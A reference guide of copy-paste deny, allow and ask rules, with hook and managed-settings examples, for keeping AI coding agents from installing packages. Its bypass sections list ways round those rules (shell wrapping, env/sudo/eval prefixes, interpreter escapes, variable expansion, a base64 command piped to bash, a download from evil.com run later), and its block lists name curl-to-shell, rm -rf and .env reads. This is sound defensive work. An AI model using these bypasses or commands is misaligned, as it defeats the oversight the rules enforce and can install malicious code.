# Reference Deny Rules for Claude Code Package Install Guardrails

This document provides complete, copy-pasteable deny rule configurations for blocking raw package install commands across all major package managers in Claude Code. Deny rules are the "fast catch" layer -- they block obvious install patterns instantly but are bypassable via shell tricks. They must be paired with PreToolUse hooks (see `hooks-research.md`) for robust enforcement.

**Rule syntax reference**: Rules use `Bash(<pattern>)` where `*` matches any sequence of characters including spaces. Space before `*` enforces a word boundary. Evaluation order is deny > ask > allow -- deny always wins regardless of where rules are defined. Compound commands (`&&`, `||`, `;`, `|`) are decomposed; each subcommand is matched independently.

---

## 1. Core Deny Rules

### 1.1 JavaScript Package Managers

```json
"Bash(npm install *)",
"Bash(npm install)",
"Bash(npm i *)",
"Bash(npm i)",
"Bash(npm add *)",
"Bash(npm add)",
"Bash(npm ci *)",
"Bash(npm ci)",
"Bash(npm update *)",
"Bash(npm update)",
"Bash(npm uninstall *)",
"Bash(npm uninstall)",
"Bash(npm remove *)",
"Bash(npm remove)",
"Bash(npx *)",
"Bash(yarn add *)",
"Bash(yarn install *)",
"Bash(yarn install)",
"Bash(yarn upgrade *)",
"Bash(yarn remove *)",
"Bash(pnpm add *)",
"Bash(pnpm install *)",
"Bash(pnpm install)",
"Bash(pnpm update *)",
"Bash(pnpm update)",
"Bash(pnpm remove *)",
"Bash(bun add *)",
"Bash(bun install *)",
"Bash(bun install)",
"Bash(bun remove *)"
```

**Notes**:
- `npm i` is the short alias for `npm install` and must be denied separately -- the glob `npm install *` does not match `npm i axios`.
- `npm ci` is included because it still executes lifecycle scripts and installs from the lockfile. If your policy allows lockfile-only installs, move `npm ci` to the `ask` list instead.
- `npx *` is denied because npx downloads and executes arbitrary packages. If your team uses npx for project-local binaries, narrow to `Bash(npx -y *)` (auto-yes) or use an allow rule for specific tools like `Bash(npx jest *)`.
- `npm update` and `npm uninstall` are included because they modify `node_modules` and `package-lock.json`, changing the dependency tree.

### 1.2 Python Package Managers

```json
"Bash(pip install *)",
"Bash(pip install)",
"Bash(pip3 install *)",
"Bash(pip3 install)",
"Bash(pip uninstall *)",
"Bash(pip3 uninstall *)",
"Bash(python -m pip install *)",
"Bash(python3 -m pip install *)",
"Bash(python -m pip uninstall *)",
"Bash(python3 -m pip uninstall *)",
"Bash(pipx install *)",
"Bash(pipx uninstall *)",
"Bash(uv pip install *)",
"Bash(uv pip install)",
"Bash(uv add *)",
"Bash(uv sync *)",
"Bash(uv sync)",
"Bash(uv remove *)"
```

**Notes**:
- `python -m pip` and `python3 -m pip` are the module-invocation forms -- they bypass the `pip` binary and must be denied separately.
- `uv sync` installs from `uv.lock`; include or exclude based on whether lockfile-only installs are permitted.
- `pip install` with no arguments is denied because it can install from `setup.py`, `pyproject.toml`, or `requirements.txt` in the current directory.

### 1.3 Rust (Cargo)

```json
"Bash(cargo add *)",
"Bash(cargo install *)",
"Bash(cargo install)"
```

**Notes**:
- `cargo build` and `cargo build --locked` are NOT denied -- they compile from existing `Cargo.lock` without adding new dependencies. Deny `cargo add` (modifies `Cargo.toml`) and `cargo install` (installs binaries globally).

### 1.4 Go

```json
"Bash(go get *)",
"Bash(go install *)"
```

**Notes**:
- `go build` is NOT denied -- it builds from existing `go.sum`. `go get` modifies `go.mod`/`go.sum` (adding or upgrading dependencies). `go install` fetches and installs binaries.

### 1.5 Ruby

```json
"Bash(gem install *)",
"Bash(bundle install *)",
"Bash(bundle install)",
"Bash(bundle add *)",
"Bash(bundle update *)",
"Bash(bundle update)"
```

### 1.6 PHP (Composer)

```json
"Bash(composer require *)",
"Bash(composer install *)",
"Bash(composer install)",
"Bash(composer update *)",
"Bash(composer update)"
```

### 1.7 Nix

```json
"Bash(nix-env -i *)",
"Bash(nix-env --install *)",
"Bash(nix-env -e *)",
"Bash(nix-env --erase *)",
"Bash(nix-env --uninstall *)",
"Bash(nix profile install *)",
"Bash(nix profile remove *)",
"Bash(cachix use *)"
```

**Notes** (from `sibling-spike-cross-reference.md`):
- `nix-env -i` is imperative install -- it bypasses flake lock pinning entirely and should always be denied.
- `nix profile install` is the modern equivalent of `nix-env -i` -- same problem.
- `cachix use *` is denied because adding an untrusted binary cache is functionally root-equivalent (the cache can serve arbitrary binaries for any derivation).
- `nix flake update` is deliberately placed in the `ask` list (Section 3) rather than `deny` -- it updates lock pins, which requires user review but is a legitimate operation.

### 1.8 System Package Managers

```json
"Bash(apt install *)",
"Bash(apt-get install *)",
"Bash(apt remove *)",
"Bash(apt-get remove *)",
"Bash(brew install *)",
"Bash(brew uninstall *)",
"Bash(pacman -S *)",
"Bash(pacman -R *)",
"Bash(dnf install *)",
"Bash(yum install *)",
"Bash(apk add *)",
"Bash(snap install *)"
```

**Notes**:
- On NixOS, `apt`/`dnf`/`yum` are irrelevant but included for portability. The rules are no-ops on systems without those package managers -- they cost nothing to include.
- `sudo` is not prefixed because Claude Code strips common process wrappers. However, `sudo` is NOT in the built-in strip list. Add explicit `sudo` variants if your agents run with sudo access (see Section 2).

### 1.9 Pipe-to-Shell Installs

```json
"Bash(curl * | bash *)",
"Bash(curl * | bash)",
"Bash(curl * | sh *)",
"Bash(curl * | sh)",
"Bash(wget * | bash *)",
"Bash(wget * | bash)",
"Bash(wget * | sh *)",
"Bash(wget * | sh)"
```

**Notes**:
- These patterns rely on Claude Code's compound command decomposition. The `|` pipe is recognized as a command separator, but the entire `curl ... | bash` pattern is also matched as a single string before decomposition.
- These do NOT catch `curl -o script.sh https://... && bash script.sh` (two-step download-then-execute). That requires a hook.

---

## 2. Bypass Mitigation Rules

These deny additional patterns that circumvent Section 1 rules. Each addresses a known bypass vector documented in `permissions-research.md` Section 7.4.

### 2.1 Shell Wrapping

```json
"Bash(bash -c *npm install*)",
"Bash(bash -c *pip install*)",
"Bash(bash -c *cargo install*)",
"Bash(bash -c *go get*)",
"Bash(bash -c *gem install*)",
"Bash(bash -c *nix-env*)",
"Bash(sh -c *npm install*)",
"Bash(sh -c *pip install*)",
"Bash(sh -c *cargo install*)",
"Bash(sh -c *go get*)",
"Bash(sh -c *gem install*)",
"Bash(sh -c *nix-env*)",
"Bash(zsh -c *npm install*)",
"Bash(zsh -c *pip install*)"
```

**Notes**:
- `bash -c` is NOT in the process wrapper strip list (only `timeout`, `time`, `nice`, `nohup`, `stdbuf`, bare `xargs` are stripped). So `bash -c "npm install evil"` bypasses `Bash(npm install *)` entirely.
- The glob `*npm install*` inside `bash -c *npm install*` works because `*` spans spaces. So `Bash(bash -c *npm install*)` matches `bash -c "npm install axios"`, `bash -c 'npm install --save axios'`, etc.
- This is inherently fragile -- see Section 5 for why hooks are needed.

### 2.2 Env/Command Prefix Bypasses

```json
"Bash(env npm install *)",
"Bash(env pip install *)",
"Bash(env pip3 install *)",
"Bash(env cargo install *)",
"Bash(env nix-env *)",
"Bash(command npm install *)",
"Bash(command pip install *)",
"Bash(command pip3 install *)",
"Bash(command cargo install *)",
"Bash(command nix-env *)"
```

**Notes**:
- `env` sets environment variables then runs the command -- `env npm install evil` runs `npm install evil` with no additional env vars. `env` is NOT in the process wrapper strip list.
- `command` is a shell builtin that bypasses shell functions/aliases -- `command npm install evil` runs the real `npm` binary. Not stripped by Claude Code.

### 2.3 Subprocess/Interpreter Escapes

```json
"Bash(python -c *subprocess*)",
"Bash(python3 -c *subprocess*)",
"Bash(python -c *import os*)",
"Bash(python3 -c *import os*)",
"Bash(node -e *child_process*)",
"Bash(node -e *execSync*)",
"Bash(node -e *spawn*)",
"Bash(ruby -e *system*)",
"Bash(perl -e *system*)"
```

**Notes**:
- These catch the most common interpreter-based bypass patterns. `python -c "import subprocess; subprocess.run(['pip', 'install', 'evil'])"` matches `Bash(python -c *subprocess*)`.
- These are extremely brittle. `python3 -c "import os; os.system('pip install evil')"` also works and requires its own pattern. An agent could trivially restructure the code to avoid these globs. **This is a best-effort fast catch, not a security boundary.**

### 2.4 Eval and Indirect Execution

```json
"Bash(eval *npm install*)",
"Bash(eval *pip install*)",
"Bash(eval *cargo*)",
"Bash(eval *nix-env*)",
"Bash(xargs npm install *)",
"Bash(xargs pip install *)",
"Bash(xargs cargo install *)"
```

**Notes**:
- Bare `xargs` (without flags) IS in the process wrapper strip list, meaning `xargs npm install < packages.txt` might already be caught by the core `npm install *` rule. However, `xargs -I {} npm install {}` is NOT bare xargs and would bypass stripping. Including these rules provides defense-in-depth.
- `eval` is a shell builtin that evaluates a string as a command. `eval "npm install evil"` bypasses deny rules if the deny rule only matches the literal `npm install *`.

### 2.5 Sudo Prefixed Commands

```json
"Bash(sudo npm install *)",
"Bash(sudo pip install *)",
"Bash(sudo pip3 install *)",
"Bash(sudo apt install *)",
"Bash(sudo apt-get install *)",
"Bash(sudo pacman -S *)",
"Bash(sudo nix-env *)",
"Bash(sudo gem install *)"
```

**Notes**:
- `sudo` is NOT in the process wrapper strip list. `sudo npm install evil` is a different command string from `npm install evil` and requires its own deny rule.

---

## 3. Allow Rules

These are the approved paths that complement the deny rules. They work because they match different command strings -- deny rules only block commands matching deny patterns, and `./scripts/safe-install npm axios` does not match `Bash(npm install *)`.

### 3.1 Wrapper Scripts

```json
"Bash(./scripts/safe-install *)",
"Bash(./.claude/hooks/safe-install.sh *)"
```

**Notes**:
- The wrapper script itself can invoke `npm install` internally. Claude Code permission rules apply to the command Claude submits, not to subprocesses spawned by that command.
- Use absolute or project-relative paths. `Bash(safe-install *)` without a path would match any binary named `safe-install` on `$PATH`, which is less controlled.

### 3.2 Package.json Script Execution

```json
"Bash(npm run *)",
"Bash(npm test *)",
"Bash(npm test)",
"Bash(npm start *)",
"Bash(npm start)",
"Bash(npm run build *)",
"Bash(yarn run *)",
"Bash(pnpm run *)",
"Bash(bun run *)"
```

**Notes**:
- `npm run <script>` executes scripts defined in `package.json`. These are generally safe because they run developer-defined commands, not arbitrary package installation.
- Caution: a malicious `package.json` could define a `"test": "npm install evil"` script. This is an edge case that hooks can catch but deny rules cannot.

### 3.3 Build and Development Commands

```json
"Bash(cargo build *)",
"Bash(cargo build)",
"Bash(cargo test *)",
"Bash(cargo test)",
"Bash(cargo run *)",
"Bash(cargo run)",
"Bash(go build *)",
"Bash(go build)",
"Bash(go test *)",
"Bash(go test)",
"Bash(go run *)",
"Bash(bundle exec *)",
"Bash(composer run-script *)"
```

### 3.4 Nix Development Commands

```json
"Bash(nix develop *)",
"Bash(nix develop)",
"Bash(nix build *)",
"Bash(nix build)",
"Bash(nix run *)",
"Bash(nix shell *)",
"Bash(nix flake check *)",
"Bash(nix flake show *)",
"Bash(devenv shell *)",
"Bash(devenv shell)"
```

**Notes**:
- `nix develop` enters a development shell defined by the flake -- this is safe because it uses pinned inputs from `flake.lock`.
- `nix flake update` is deliberately NOT in the allow list. It belongs in the `ask` list (Section 3.6) because it updates lock pins and requires user review.

### 3.5 Read-Only / Informational Commands

```json
"Bash(npm list *)",
"Bash(npm ls *)",
"Bash(npm outdated *)",
"Bash(npm audit *)",
"Bash(npm view *)",
"Bash(npm info *)",
"Bash(pip list *)",
"Bash(pip show *)",
"Bash(pip freeze *)",
"Bash(pip-audit *)",
"Bash(cargo audit *)",
"Bash(vulnix *)",
"Bash(nix flake info *)",
"Bash(nix flake metadata *)"
```

### 3.6 Ask Rules (Prompt for User Confirmation)

These are not allow or deny -- they prompt the user every time. Place in the `ask` array:

```json
"Bash(nix flake update *)",
"Bash(nix flake update)",
"Bash(pip install -r requirements.txt *)",
"Bash(pip install -r requirements.txt)",
"Bash(pip install -e . *)",
"Bash(pip install -e .)"
```

**Notes**:
- `nix flake update` modifies `flake.lock` and changes the dependency closure for the entire project. It should require explicit user approval.
- `pip install -r requirements.txt` installs from a lockfile equivalent. Whether to allow or ask depends on your threat model -- if requirements.txt is committed and reviewed, allowing may be acceptable.
- `pip install -e .` installs the current project in editable mode -- legitimate during development but still runs `setup.py`.

---

## 4. Settings.json Configurations

### 4.1 Individual Developer (`~/.claude/settings.json`)

For a single developer who wants package guardrails across all projects. This configuration denies raw installs, allows common development commands, and forces installs through wrapper scripts.

```json
{
  "permissions": {
    "deny": [
      "Bash(npm install *)",
      "Bash(npm install)",
      "Bash(npm i *)",
      "Bash(npm i)",
      "Bash(npm add *)",
      "Bash(npm ci *)",
      "Bash(npm ci)",
      "Bash(npm update *)",
      "Bash(npm update)",
      "Bash(npm uninstall *)",
      "Bash(npm remove *)",
      "Bash(npx *)",
      "Bash(yarn add *)",
      "Bash(yarn install *)",
      "Bash(yarn install)",
      "Bash(yarn upgrade *)",
      "Bash(yarn remove *)",
      "Bash(pnpm add *)",
      "Bash(pnpm install *)",
      "Bash(pnpm install)",
      "Bash(pnpm update *)",
      "Bash(pnpm remove *)",
      "Bash(bun add *)",
      "Bash(bun install *)",
      "Bash(bun install)",
      "Bash(bun remove *)",
      "Bash(pip install *)",
      "Bash(pip install)",
      "Bash(pip3 install *)",
      "Bash(pip3 install)",
      "Bash(pip uninstall *)",
      "Bash(pip3 uninstall *)",
      "Bash(python -m pip install *)",
      "Bash(python3 -m pip install *)",
      "Bash(pipx install *)",
      "Bash(uv pip install *)",
      "Bash(uv add *)",
      "Bash(uv sync *)",
      "Bash(uv sync)",
      "Bash(uv remove *)",
      "Bash(cargo add *)",
      "Bash(cargo install *)",
      "Bash(cargo install)",
      "Bash(go get *)",
      "Bash(go install *)",
      "Bash(gem install *)",
      "Bash(bundle install *)",
      "Bash(bundle install)",
      "Bash(bundle add *)",
      "Bash(bundle update *)",
      "Bash(composer require *)",
      "Bash(composer install *)",
      "Bash(composer install)",
      "Bash(composer update *)",
      "Bash(nix-env -i *)",
      "Bash(nix-env --install *)",
      "Bash(nix-env -e *)",
      "Bash(nix-env --erase *)",
      "Bash(nix profile install *)",
      "Bash(nix profile remove *)",
      "Bash(cachix use *)",
      "Bash(apt install *)",
      "Bash(apt-get install *)",
      "Bash(brew install *)",
      "Bash(pacman -S *)",
      "Bash(snap install *)",
      "Bash(curl * | bash *)",
      "Bash(curl * | bash)",
      "Bash(curl * | sh *)",
      "Bash(curl * | sh)",
      "Bash(wget * | bash *)",
      "Bash(wget * | bash)",
      "Bash(wget * | sh *)",
      "Bash(wget * | sh)",
      "Bash(bash -c *npm install*)",
      "Bash(bash -c *pip install*)",
      "Bash(bash -c *cargo install*)",
      "Bash(bash -c *nix-env*)",
      "Bash(sh -c *npm install*)",
      "Bash(sh -c *pip install*)",
      "Bash(sh -c *cargo install*)",
      "Bash(sh -c *nix-env*)",
      "Bash(env npm install *)",
      "Bash(env pip install *)",
      "Bash(env pip3 install *)",
      "Bash(env cargo install *)",
      "Bash(env nix-env *)",
      "Bash(command npm install *)",
      "Bash(command pip install *)",
      "Bash(command pip3 install *)",
      "Bash(command cargo install *)",
      "Bash(command nix-env *)",
      "Bash(sudo npm install *)",
      "Bash(sudo pip install *)",
      "Bash(sudo pip3 install *)",
      "Bash(sudo apt install *)",
      "Bash(sudo apt-get install *)",
      "Bash(sudo nix-env *)",
      "Bash(sudo gem install *)",
      "Bash(python -c *subprocess*)",
      "Bash(python3 -c *subprocess*)",
      "Bash(node -e *child_process*)",
      "Bash(node -e *execSync*)",
      "Bash(eval *npm install*)",
      "Bash(eval *pip install*)",
      "Bash(eval *nix-env*)"
    ],
    "ask": [
      "Bash(nix flake update *)",
      "Bash(nix flake update)"
    ],
    "allow": [
      "Bash(./scripts/safe-install *)",
      "Bash(npm run *)",
      "Bash(npm test *)",
      "Bash(npm test)",
      "Bash(npm start *)",
      "Bash(npm start)",
      "Bash(npm run build *)",
      "Bash(yarn run *)",
      "Bash(pnpm run *)",
      "Bash(bun run *)",
      "Bash(cargo build *)",
      "Bash(cargo build)",
      "Bash(cargo test *)",
      "Bash(cargo test)",
      "Bash(cargo run *)",
      "Bash(go build *)",
      "Bash(go build)",
      "Bash(go test *)",
      "Bash(go test)",
      "Bash(nix develop *)",
      "Bash(nix develop)",
      "Bash(nix build *)",
      "Bash(nix build)",
      "Bash(nix flake check *)",
      "Bash(nix flake show *)",
      "Bash(devenv shell *)",
      "Bash(devenv shell)",
      "Bash(npm list *)",
      "Bash(npm ls *)",
      "Bash(npm outdated *)",
      "Bash(npm audit *)",
      "Bash(pip list *)",
      "Bash(pip show *)",
      "Bash(pip freeze *)",
      "Bash(pip-audit *)",
      "Bash(cargo audit *)",
      "Bash(vulnix *)"
    ]
  }
}
```

### 4.2 Team Project (`.claude/settings.json`)

For a team project committed to version control. Adds hooks, tightens allow rules to project-specific wrapper scripts, and disables bypass mode. Every team member gets these rules automatically.

```json
{
  "permissions": {
    "defaultMode": "default",
    "disableBypassPermissionsMode": "disable",
    "deny": [
      "Bash(npm install *)",
      "Bash(npm install)",
      "Bash(npm i *)",
      "Bash(npm i)",
      "Bash(npm add *)",
      "Bash(npm ci *)",
      "Bash(npm ci)",
      "Bash(npm update *)",
      "Bash(npm update)",
      "Bash(npm uninstall *)",
      "Bash(npm remove *)",
      "Bash(npx *)",
      "Bash(yarn add *)",
      "Bash(yarn install *)",
      "Bash(yarn install)",
      "Bash(yarn upgrade *)",
      "Bash(yarn remove *)",
      "Bash(pnpm add *)",
      "Bash(pnpm install *)",
      "Bash(pnpm install)",
      "Bash(pnpm update *)",
      "Bash(pnpm remove *)",
      "Bash(bun add *)",
      "Bash(bun install *)",
      "Bash(bun install)",
      "Bash(bun remove *)",
      "Bash(pip install *)",
      "Bash(pip install)",
      "Bash(pip3 install *)",
      "Bash(pip3 install)",
      "Bash(pip uninstall *)",
      "Bash(pip3 uninstall *)",
      "Bash(python -m pip install *)",
      "Bash(python3 -m pip install *)",
      "Bash(python -m pip uninstall *)",
      "Bash(python3 -m pip uninstall *)",
      "Bash(pipx install *)",
      "Bash(uv pip install *)",
      "Bash(uv pip install)",
      "Bash(uv add *)",
      "Bash(uv sync *)",
      "Bash(uv sync)",
      "Bash(uv remove *)",
      "Bash(cargo add *)",
      "Bash(cargo install *)",
      "Bash(cargo install)",
      "Bash(go get *)",
      "Bash(go install *)",
      "Bash(gem install *)",
      "Bash(bundle install *)",
      "Bash(bundle install)",
      "Bash(bundle add *)",
      "Bash(bundle update *)",
      "Bash(bundle update)",
      "Bash(composer require *)",
      "Bash(composer install *)",
      "Bash(composer install)",
      "Bash(composer update *)",
      "Bash(composer update)",
      "Bash(nix-env -i *)",
      "Bash(nix-env --install *)",
      "Bash(nix-env -e *)",
      "Bash(nix-env --erase *)",
      "Bash(nix-env --uninstall *)",
      "Bash(nix profile install *)",
      "Bash(nix profile remove *)",
      "Bash(cachix use *)",
      "Bash(apt install *)",
      "Bash(apt-get install *)",
      "Bash(apt remove *)",
      "Bash(apt-get remove *)",
      "Bash(brew install *)",
      "Bash(brew uninstall *)",
      "Bash(pacman -S *)",
      "Bash(pacman -R *)",
      "Bash(dnf install *)",
      "Bash(yum install *)",
      "Bash(apk add *)",
      "Bash(snap install *)",
      "Bash(curl * | bash *)",
      "Bash(curl * | bash)",
      "Bash(curl * | sh *)",
      "Bash(curl * | sh)",
      "Bash(wget * | bash *)",
      "Bash(wget * | bash)",
      "Bash(wget * | sh *)",
      "Bash(wget * | sh)",
      "Bash(bash -c *npm install*)",
      "Bash(bash -c *pip install*)",
      "Bash(bash -c *cargo install*)",
      "Bash(bash -c *go get*)",
      "Bash(bash -c *gem install*)",
      "Bash(bash -c *nix-env*)",
      "Bash(sh -c *npm install*)",
      "Bash(sh -c *pip install*)",
      "Bash(sh -c *cargo install*)",
      "Bash(sh -c *go get*)",
      "Bash(sh -c *gem install*)",
      "Bash(sh -c *nix-env*)",
      "Bash(zsh -c *npm install*)",
      "Bash(zsh -c *pip install*)",
      "Bash(env npm install *)",
      "Bash(env pip install *)",
      "Bash(env pip3 install *)",
      "Bash(env cargo install *)",
      "Bash(env nix-env *)",
      "Bash(command npm install *)",
      "Bash(command pip install *)",
      "Bash(command pip3 install *)",
      "Bash(command cargo install *)",
      "Bash(command nix-env *)",
      "Bash(sudo npm install *)",
      "Bash(sudo pip install *)",
      "Bash(sudo pip3 install *)",
      "Bash(sudo apt install *)",
      "Bash(sudo apt-get install *)",
      "Bash(sudo pacman -S *)",
      "Bash(sudo nix-env *)",
      "Bash(sudo gem install *)",
      "Bash(python -c *subprocess*)",
      "Bash(python3 -c *subprocess*)",
      "Bash(python -c *import os*)",
      "Bash(python3 -c *import os*)",
      "Bash(node -e *child_process*)",
      "Bash(node -e *execSync*)",
      "Bash(node -e *spawn*)",
      "Bash(ruby -e *system*)",
      "Bash(perl -e *system*)",
      "Bash(eval *npm install*)",
      "Bash(eval *pip install*)",
      "Bash(eval *cargo*)",
      "Bash(eval *nix-env*)",
      "Bash(xargs npm install *)",
      "Bash(xargs pip install *)",
      "Bash(xargs cargo install *)",
      "Bash(git push --force *)",
      "Bash(git push * --force)",
      "Bash(git reset --hard *)",
      "Bash(rm -rf *)",
      "Read(./.env)",
      "Read(./.env.*)",
      "Read(./secrets/**)"
    ],
    "ask": [
      "Bash(nix flake update *)",
      "Bash(nix flake update)",
      "Bash(pip install -r requirements.txt *)",
      "Bash(pip install -r requirements.txt)",
      "Bash(pip install -e . *)",
      "Bash(pip install -e .)"
    ],
    "allow": [
      "Bash(./scripts/safe-install *)",
      "Bash(./.claude/hooks/safe-install.sh *)",
      "Bash(npm run *)",
      "Bash(npm test *)",
      "Bash(npm test)",
      "Bash(npm start *)",
      "Bash(npm start)",
      "Bash(npm run build *)",
      "Bash(yarn run *)",
      "Bash(pnpm run *)",
      "Bash(bun run *)",
      "Bash(cargo build *)",
      "Bash(cargo build)",
      "Bash(cargo test *)",
      "Bash(cargo test)",
      "Bash(cargo run *)",
      "Bash(go build *)",
      "Bash(go build)",
      "Bash(go test *)",
      "Bash(go test)",
      "Bash(go run *)",
      "Bash(bundle exec *)",
      "Bash(composer run-script *)",
      "Bash(nix develop *)",
      "Bash(nix develop)",
      "Bash(nix build *)",
      "Bash(nix build)",
      "Bash(nix run *)",
      "Bash(nix shell *)",
      "Bash(nix flake check *)",
      "Bash(nix flake show *)",
      "Bash(devenv shell *)",
      "Bash(devenv shell)",
      "Bash(npm list *)",
      "Bash(npm ls *)",
      "Bash(npm outdated *)",
      "Bash(npm audit *)",
      "Bash(npm view *)",
      "Bash(npm info *)",
      "Bash(pip list *)",
      "Bash(pip show *)",
      "Bash(pip freeze *)",
      "Bash(pip-audit *)",
      "Bash(cargo audit *)",
      "Bash(vulnix *)",
      "Bash(nix flake info *)",
      "Bash(nix flake metadata *)",
      "Bash(git status)",
      "Bash(git diff *)",
      "Bash(git add *)",
      "Bash(git commit *)",
      "Bash(git log *)",
      "Bash(* --version)",
      "Bash(* --help *)"
    ]
  },
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "\"${CLAUDE_PROJECT_DIR}\"/.claude/hooks/package-guard.sh",
            "timeout": 30,
            "statusMessage": "Checking package install safety..."
          }
        ]
      }
    ]
  }
}
```

### 4.3 Enterprise Managed (`/etc/claude-code/managed-settings.json`)

For organization-wide mandatory enforcement. These rules cannot be overridden by any user, project, or CLI argument. Use this when company policy requires centralized control over all Claude Code agent activity.

```json
{
  "permissions": {
    "disableBypassPermissionsMode": "disable",
    "deny": [
      "Bash(npm install *)",
      "Bash(npm install)",
      "Bash(npm i *)",
      "Bash(npm i)",
      "Bash(npm add *)",
      "Bash(npm ci *)",
      "Bash(npm ci)",
      "Bash(npm update *)",
      "Bash(npm update)",
      "Bash(npm uninstall *)",
      "Bash(npm remove *)",
      "Bash(npx *)",
      "Bash(yarn add *)",
      "Bash(yarn install *)",
      "Bash(yarn install)",
      "Bash(yarn upgrade *)",
      "Bash(yarn remove *)",
      "Bash(pnpm add *)",
      "Bash(pnpm install *)",
      "Bash(pnpm install)",
      "Bash(pnpm update *)",
      "Bash(pnpm remove *)",
      "Bash(bun add *)",
      "Bash(bun install *)",
      "Bash(bun install)",
      "Bash(bun remove *)",
      "Bash(pip install *)",
      "Bash(pip install)",
      "Bash(pip3 install *)",
      "Bash(pip3 install)",
      "Bash(pip uninstall *)",
      "Bash(pip3 uninstall *)",
      "Bash(python -m pip install *)",
      "Bash(python3 -m pip install *)",
      "Bash(python -m pip uninstall *)",
      "Bash(python3 -m pip uninstall *)",
      "Bash(pipx install *)",
      "Bash(pipx uninstall *)",
      "Bash(uv pip install *)",
      "Bash(uv pip install)",
      "Bash(uv add *)",
      "Bash(uv sync *)",
      "Bash(uv sync)",
      "Bash(uv remove *)",
      "Bash(cargo add *)",
      "Bash(cargo install *)",
      "Bash(cargo install)",
      "Bash(go get *)",
      "Bash(go install *)",
      "Bash(gem install *)",
      "Bash(bundle install *)",
      "Bash(bundle install)",
      "Bash(bundle add *)",
      "Bash(bundle update *)",
      "Bash(bundle update)",
      "Bash(composer require *)",
      "Bash(composer install *)",
      "Bash(composer install)",
      "Bash(composer update *)",
      "Bash(composer update)",
      "Bash(nix-env -i *)",
      "Bash(nix-env --install *)",
      "Bash(nix-env -e *)",
      "Bash(nix-env --erase *)",
      "Bash(nix-env --uninstall *)",
      "Bash(nix profile install *)",
      "Bash(nix profile remove *)",
      "Bash(cachix use *)",
      "Bash(apt install *)",
      "Bash(apt-get install *)",
      "Bash(apt remove *)",
      "Bash(apt-get remove *)",
      "Bash(brew install *)",
      "Bash(brew uninstall *)",
      "Bash(pacman -S *)",
      "Bash(pacman -R *)",
      "Bash(dnf install *)",
      "Bash(yum install *)",
      "Bash(apk add *)",
      "Bash(snap install *)",
      "Bash(curl * | bash *)",
      "Bash(curl * | bash)",
      "Bash(curl * | sh *)",
      "Bash(curl * | sh)",
      "Bash(wget * | bash *)",
      "Bash(wget * | bash)",
      "Bash(wget * | sh *)",
      "Bash(wget * | sh)",
      "Bash(bash -c *npm install*)",
      "Bash(bash -c *pip install*)",
      "Bash(bash -c *cargo install*)",
      "Bash(bash -c *go get*)",
      "Bash(bash -c *gem install*)",
      "Bash(bash -c *nix-env*)",
      "Bash(sh -c *npm install*)",
      "Bash(sh -c *pip install*)",
      "Bash(sh -c *cargo install*)",
      "Bash(sh -c *go get*)",
      "Bash(sh -c *gem install*)",
      "Bash(sh -c *nix-env*)",
      "Bash(zsh -c *npm install*)",
      "Bash(zsh -c *pip install*)",
      "Bash(env npm install *)",
      "Bash(env pip install *)",
      "Bash(env pip3 install *)",
      "Bash(env cargo install *)",
      "Bash(env nix-env *)",
      "Bash(command npm install *)",
      "Bash(command pip install *)",
      "Bash(command pip3 install *)",
      "Bash(command cargo install *)",
      "Bash(command nix-env *)",
      "Bash(sudo npm install *)",
      "Bash(sudo pip install *)",
      "Bash(sudo pip3 install *)",
      "Bash(sudo apt install *)",
      "Bash(sudo apt-get install *)",
      "Bash(sudo pacman -S *)",
      "Bash(sudo nix-env *)",
      "Bash(sudo gem install *)",
      "Bash(python -c *subprocess*)",
      "Bash(python3 -c *subprocess*)",
      "Bash(python -c *import os*)",
      "Bash(python3 -c *import os*)",
      "Bash(node -e *child_process*)",
      "Bash(node -e *execSync*)",
      "Bash(node -e *spawn*)",
      "Bash(ruby -e *system*)",
      "Bash(perl -e *system*)",
      "Bash(eval *npm install*)",
      "Bash(eval *pip install*)",
      "Bash(eval *cargo*)",
      "Bash(eval *nix-env*)",
      "Bash(xargs npm install *)",
      "Bash(xargs pip install *)",
      "Bash(xargs cargo install *)"
    ]
  },
  "disableAutoMode": "disable",
  "allowManagedHooksOnly": true,
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "/opt/company/claude-hooks/package-guard.sh",
            "timeout": 30,
            "statusMessage": "Enterprise package policy check..."
          }
        ]
      }
    ]
  }
}
```

**Enterprise deployment notes**:
- `allowManagedHooksOnly: true` prevents users from disabling hooks or adding their own. Only managed hooks, SDK hooks, and force-enabled plugin hooks load.
- `disableAutoMode: "disable"` prevents auto mode, which has a classifier that may auto-approve lockfile-based installs.
- `disableBypassPermissionsMode: "disable"` prevents bypass mode entirely.
- Deny rules in managed settings cannot be overridden by any user, project, or local settings file -- they always take precedence.
- Project teams can still define their own `allow` rules (unless `allowManagedPermissionRulesOnly: true` is also set, which blocks ALL user/project permission rules).
- Use `/etc/claude-code/managed-settings.d/` for modular policy files. Files are loaded alphabetically; arrays concatenate across files.

---

## 5. Known Gaps

Deny rules are a **fast catch** layer. They block the commands Claude is most likely to submit in their literal form. They are NOT a security boundary. The following gaps require PreToolUse hooks, OS sandboxing, or environment-level configuration to address.

### 5.1 Variable Expansion

```bash
PKG=evil && npm install $PKG
```

The deny rule sees the literal string `npm install $PKG`, not `npm install evil`. The variable is expanded by the shell after Claude Code evaluates the deny rule. **Deny rules match the command string, not the expanded command.**

**Mitigation**: PreToolUse hooks receive the same unexpanded string, so hooks alone do not fix this. OS-level sandbox network restrictions are the catch here -- even if `npm install evil` runs, the sandbox can restrict which domains the install reaches.

### 5.2 Encoded/Obfuscated Commands

```bash
echo "bnBtIGluc3RhbGwgZXZpbA==" | base64 -d | bash
```

Base64-encoded commands, hex-encoded commands, or any form of string construction bypass both deny rules and regex-based hooks.

**Mitigation**: OS sandbox + network domain allowlists. The `prompt` hook type (LLM-based analysis) could potentially detect obfuscation patterns, but adds latency and non-determinism.

### 5.3 Multi-Step Download-Then-Execute

```bash
curl -o /tmp/setup.sh https://evil.com/setup.sh
# ... later, in a separate tool call ...
bash /tmp/setup.sh
```

Deny rules catch `curl ... | bash` (single pipe), but a two-step approach where the download and execution are in separate Bash tool calls evades the pipe-to-shell pattern.

**Mitigation**: OS sandbox filesystem restrictions (deny write to `/tmp` or restrict which files can be executed). Network domain allowlists block the download step.

### 5.4 Indirect Installation via Build Tools

```bash
make install
Makefile: npm install evil
```

Or via scripts defined in `package.json`, `Cargo.toml` build scripts, `setup.py`, etc. The deny rule sees `make install`, not the underlying package install.

